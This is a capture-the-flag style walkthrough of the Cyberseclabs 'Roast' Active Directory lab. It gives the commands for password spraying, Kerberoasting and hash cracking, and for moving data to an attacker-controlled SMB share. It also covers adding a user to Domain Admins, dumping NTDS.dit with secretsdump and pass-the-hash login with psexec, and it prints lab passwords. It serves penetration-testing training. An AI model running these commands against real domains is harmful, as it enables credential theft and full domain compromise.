## Cyberseclabs - Roast Walkthrough


## Nmap Scan 
As usual, we start off with a nmap scan to discover open ports and its corresponding services running on the system.

![nmap_scan.PNG](/images/roast/Nmap/nmap_scan.PNG)

From the nmap scan , we see a bunch of open ports, mainly
- Port 88 : Kerberos
- Ports 135,139,445 : SMB 
- Ports 389,3268 : LDAP
- Port 3389 : RDP
- Port 5985 : Winrm 

Before we continue, we have to edit our **hosts** file and add the  domain name + IP address 

![hosts.PNG](/images/roast/Nmap/hosts.PNG)

## SMB Enumeration
Let's start off by enumerating SMB, to see if we have anonymous access (a.k.a NULL Session).

![smbclient.PNG](/images/roast/Nmap/smbclient.PNG)

As seen above, no shares were shown/discovered when we login to smb as anonymous 

Since we do not have any credentials or information on SMB, let's turn our attention to LDAP.

## LDAP Enumeration
One great tool to enumerate LDAP that is build into Kali Linux is **ldapsearch**.
![namingcontexts.PNG](/images/roast/LDAP/namingcontexts.PNG)
<u>ldapsearch -h 172.31.3.2 -x -s base namingcontexts</u>

By running the above command, we get the base DN so that we can do our ldap query later on.

![dsmith.PNG](/images/roast/LDAP/dsmith.PNG)
![crhodes.PNG](/images/roast/LDAP/crhodes.PNG)
![ssmith.PNG](/images/roast/LDAP/ssmith.PNG)
<u>ldapsearch -h 172.31.3.2 -x -b "DC=roast,DC=csl"</u>

Looking at the output above , we discovered 3 users and user **dsmith** has its password in his description. (WelcomeToR04st)

We went back to **enumerate smb** with user **dsmith**'s credentials, however, nothing interesting there.

## RPC User Enumeration 
Upon obtaining user **dsmith**'s credentials, I tried to enumerate for more users using rpcclient 
![enumdomusers.PNG](/images/roast/rpcclient/enumdomusers.PNG)
From the output, there is an additional non-default user  **roastsvc**.

## Kerbrute PasswordSpray
Since evil-winrm does not return us a shell as user **dsmith**, let's try some password spraying to see if any other users share the same password as **dsmith**
![passwordspraying.PNG](/images/roast/kerbrute/passwordspraying.PNG)
<u>./kerbrute_linux_amd64 passwordspray -v -d roast.csl --dc 172.31.3.2 users.txt WelcomeToR04st</u>

Through password spraying, we discover that user **crhodes** also shares the same password as user **dsmith**. 

## Enumerate users with SPN set
Let's obtain a shell as user **crhodes** using evil-winrm and at the same time, load [PowerView](https://github.com/PowerShellMafia/PowerSploit) powershell script.
![crhodes.PNG](/images/roast/kerberoast/crhodes.PNG)
After obtaining a shell as user **crhodes**, we realised that the access.txt is not in the Desktop directory. It means we have to enumerate more and esclate ourselves to another user. 

From here, we can get more information on all the AD users by running PowerView's command **Get-NetUser -SPN** to list all users with a SPN set. 

![SPN.PNG](/images/roast/kerberoast/SPN.PNG)
From the output, we discover that user **roastsvc** has a serviceprincipalname(SPN) set. With this information, it tells us that user **roastsvc** is **likely** susceptible to **kerberoasting**.

## Kerberoasting 
Since we know that user **roastsvc** is likely vulnerable to kerberoasting, we can use [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) by impacket to obtain the TGS and take it offline to crack
![TGS.PNG](/images/roast/kerberoast/TGS.PNG)

Once we obtain the TGS, let's crack it with hashcat
![cracked_tgs.PNG](/images/roast/kerberoast/cracked_tgs.PNG)
<u>hashcat -m 13100 -a 0 roastsvc_spn /usr/share/wordlists/rockyou.txt</u>

Credentials -> roastsvc:!!!watermelon245

## Privilege Esclation to SYSTEM
Once we get a shell as user **roastsvc**, we upload and run [BloodHound](https://github.com/BloodHoundAD/BloodHound) against the machine to reveal any misconfigured AD relationships.

First, let's setup a smb-server using impacket then mount the smb share on the target machine, so that we can upload Bloodhound and download the bloodhound output with ease
- Setup impacket's smb-server
	![smbserver.PNG](/images/roast/SMBServer/smbserver.PNG)
	Syntax : impacket-smbserver (sharename) (directory) -smb2support -username (your-username) -password (your-password)
- Setup new PSDrive on target machine and mount the share
	![mount.PNG](/images/roast/SMBServer/mount.PNG)
	- $pass = convertto-securestring (your-password) -AsPlainText -Force
	- $cred = New-Object System.Management.Automation.PSCredential('(your-username)', $pass)
	- New-PSDrive -Name (your-username) -PSProvider FileSystem -Credential $cred \\\\(your-ip)\(share-name)
- CD into your share, run bloodhound 
	![sharphound.PNG](/images/roast/SMBServer/sharphound.PNG)
	- Make sure you upload bloodhound to the directory you created as the share
- Start Bloodhound 
	![bloodhound.PNG](/images/roast/SMBServer/bloodhound.PNG)
	- neo4j console start
	- bloodhound 

- Upload the bloodhound output to analyze 
	![bloodhound_output.PNG](/images/roast/SMBServer/bloodhound_output.PNG)
	- Drag and drop the zip file into the bloodhound console

Once we are done setting up BloodHound, let's start analyzing the output that we have gathered from the target machine.
- Mark user **roastsvc** as **Owned**
	![owned_user.jpg](/images/roast/SYSTEM/owned_user.jpg)
- Use the built-in query 
	![path_to_DA.jpg](/images/roast/SYSTEM/path_to_DA.jpg)
	- "Shortest Path to Domain Admins from Owned Principals"

From here, we found out that user **roastsvc** has **GenericWrite** to group **Domain Admins**.

![generic_write.PNG](/images/roast/SYSTEM/generic_write.PNG)
- **GenericWrite** : Provides write access to all properties

Since user **roastsvc** has **GenericWrite** permission to the **Domain Admins** group, we can simply just add user **roastsvc** into the **Domain Admins** group.
- List all current members of **Domain Admins** group
	![original_DA_members.PNG](/images/roast/SYSTEM/original_DA_members.PNG)
	- net group (group-name) /domain
- Add user **roastsvc** into **Domain Admins** group
	![add_to_DA.PNG](/images/roast/SYSTEM/add_to_DA.PNG)
	- net group (group-name) (user-to-add) /ADD /DOMAIN 
- Check if user **roastsvc** is added into the group
	![updated_DA_members.PNG](/images/roast/SYSTEM/updated_DA_members.PNG)
	- net group (group-name) /domain

Lastly, we can dump the NTDS.dit hash file for the Administrator's hash using [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/impacket/examples/secretsdump.py) by impacket and [PSExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) into the target machine
- Dumping the NTDS.dit hash file 
	![secretsdump.PNG](/images/roast/SYSTEM/secretsdump.PNG)
	- python secretsdump.py (domain-name)/(user)@(domain-name) -dc-ip 172.31.3.2
- Get the Administrator's hash
	![admin_hash.PNG](/images/roast/SYSTEM/admin_hash.PNG)
	
- PSExec 
	![psexec.PNG](/images/roast/SYSTEM/psexec.PNG)
	- python psexec.py (domain-name)/user@(domain-name) -hashes (admin-hash) -dc-ip 172.31.3.2 




















